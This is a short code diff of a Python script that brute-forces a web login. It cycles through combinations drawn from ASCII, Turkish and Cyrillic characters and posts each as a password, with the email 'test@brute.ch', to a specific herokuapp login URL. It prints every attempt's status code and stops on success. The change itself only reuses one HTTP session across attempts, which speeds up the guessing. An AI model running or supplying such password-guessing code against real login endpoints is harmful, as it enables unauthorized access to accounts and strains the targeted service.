@@ -16,6 +16,7 @@ def main():
     chars = string.ascii_letters + string.digits + string.punctuation + turkish + cyrillic
     index = chars.index(start_char)
     rotated = chars[index:] + chars[:index]
+    session = requests.Session()
 
     while True:
         for length in range(min_length - 1, password_length):
@@ -28,7 +29,6 @@ def main():
                                 "email": "test@brute.ch",
                                 "password": combination,
                             }
-                            session = requests.Session()
                             response = session.post("https://serverapp-afb1a71b45e2.herokuapp.com/login", json=payload, timeout=5)
                             print(combination, response.status_code)
                             if response.ok:
